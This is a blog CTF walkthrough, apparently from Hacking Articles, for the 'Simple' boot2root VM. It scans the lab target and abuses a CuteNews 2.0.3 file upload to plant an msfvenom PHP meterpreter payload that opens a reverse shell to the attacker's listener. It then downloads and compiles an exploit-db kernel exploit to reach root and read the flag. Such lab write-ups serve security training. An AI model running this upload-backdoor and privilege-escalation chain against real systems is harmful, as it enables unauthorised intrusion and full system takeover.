@@ -1,0 +1,447 @@
+
+								
+																		Hack the Simple VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 7, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Simple CTF is a boot2root that focuses on the basics of web-based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don’t have physical access to this machine. Therefore, tricks like editing the VM’s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal. Therefore, in this article, I will walk you through the whole method of completing this challenge.
+First Download Simple VM from here
+Breaching Methodology:
+
+Network Scanning (Netdiscover, Nmap)
+Enumerate File upload vulnerability (searchsploit)
+Generate PHP Backdoor (Msfvenom)
+Upload and execute a backdoor
+Reverse connection (Metasploit)
+Import python one-liner for proper TTY shell
+Kernel Privilege Escalation
+Get Root access and capture the flag.
+
+We start by identifying our target with the following command :
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Our target is 192.168.1.106
+Then move on to scanning our target with nmap
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.106
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.106
+					
+				
+			
+		
+
+
+On scanning, you will find that port 80 is open which will be pointing toward cutenews. So we will now open it on our browser.
+
+Now we can see that our target is using CuteNews v.2.0.3 and the good news is it is exploitable, so let’s search for its exploit:
+
+		
+		
+			
+			
+			
+			
+searchsploit cutenews 2.0.3
+			
+				
+					
+				
+					1
+				
+						searchsploit cutenews 2.0.3
+					
+				
+			
+		
+
+
+Upon searching for the exploit we can see that we have the path for the exploit. Follow the path and go to the exploit’s “.txt” file. In the text file, you find the instructions to upload the file. The first thing it tells us to register on the website in order to have the power to upload a file.
+
+To register it will ask you to give your username and password as shown below.
+
+When you complete the steps of registering them, it will redirect you to the following window:
+
+Now we need to upload the file so make it with the help of msfvenom following command:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
+					
+				
+			
+		
+
+On the other hand run multi/handler inside Metasploit framework.
+
+Copy the code from &lt;?php to die() and save it in a file with .php extension. To upload the file login from the username with which you have just registered and then click on personal options give your username and mail ID and then browse the file that you want to upload and then click on save.
+
+Now we will use dirb to find the directories. And for that type:
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.106
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.106
+					
+				
+			
+		
+
+
+It will show you /uploads directory. This is the directory where your file will be uploaded. Open the directory in the browser and you find your uploaded file there.
+
+Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.108
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 192.168.1.108msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe Meterpreter session 1. But the task is not finished yet, still, we need to penetrate more for privilege escalation.
+
+		
+		
+			
+			
+			
+			
+shell
+			
+				
+					
+				
+					1
+				
+						shell
+					
+				
+			
+		
+
+Then to access proper TTY shell we had import python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+			
+				
+					
+				
+					1
+				
+						cd /tmp
+					
+				
+			
+		
+
+
+Using sysinfo command I found machine architecture that helps me to find out a kernel exploit for privilege escalation and with help of Google search, we got an exploit 36746.
+
+As we know that version of the kernel is vulnerable, consequently we will download its exploit by the command as given below: 
+
+		
+		
+			
+			
+			
+			
+wget https//www.exploit-db.com/download/36746.c
+			
+				
+					
+				
+					1
+				
+						wget https//www.exploit-db.com/download/36746.c
+					
+				
+			
+		
+
+This will install the exploit successfully. Moving forward, we will compile the file:
+
+		
+		
+			
+			
+			
+			
+gcc 36746.c -o access -static
+			
+				
+					
+				
+					1
+				
+						gcc 36746.c -o access -static
+					
+				
+			
+		
+
+Now we will open the file access:
+
+		
+		
+			
+			
+			
+			
+./access
+			
+				
+					
+				
+					1
+				
+						./access
+					
+				
+			
+		
+
+Then type id to know the users and then type:
+
+		
+		
+			
+			
+			
+			
+cd /root
+			
+				
+					
+				
+					1
+				
+						cd /root
+					
+				
+			
+		
+
+and will take you into the /root. Further type:
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+It will list the files and one of those files will be flag.txt. To read the flag type:
+
+		
+		
+			
+			
+			
+			
+cat flag.txt
+			
+				
+					
+				
+					1
+				
+						cat flag.txt
+					
+				
+			
+		
+
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
